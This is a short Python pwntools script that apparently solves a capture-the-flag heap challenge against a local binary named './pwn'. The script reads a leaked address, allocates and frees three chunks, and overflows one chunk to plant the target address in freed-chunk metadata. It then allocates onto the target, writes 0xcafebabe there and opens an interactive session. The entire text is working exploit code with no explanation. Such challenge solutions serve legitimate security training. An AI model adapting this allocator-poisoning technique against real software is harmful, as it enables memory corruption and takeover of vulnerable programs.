from pwn import *
# context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./pwn')
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def cmd(c):
    sla(b">",str(c).encode())
def add(c=b"A"):
    cmd(1)
    s(c)
def free(idx):
    cmd(2)
    cmd(idx)
ru(b"C_FLAG is ")
target = int(ru(b",")[:-1],16)
warning(hex(target))
add()
add()
add()
free(2)
free(1)
free(0)
add(b"\1"*0x18+p64(0)+p64(target))
add()
add(p64(0xcafebabe))
cmd(3)
# gdb.attach(p)
p.interactive("n132# ")
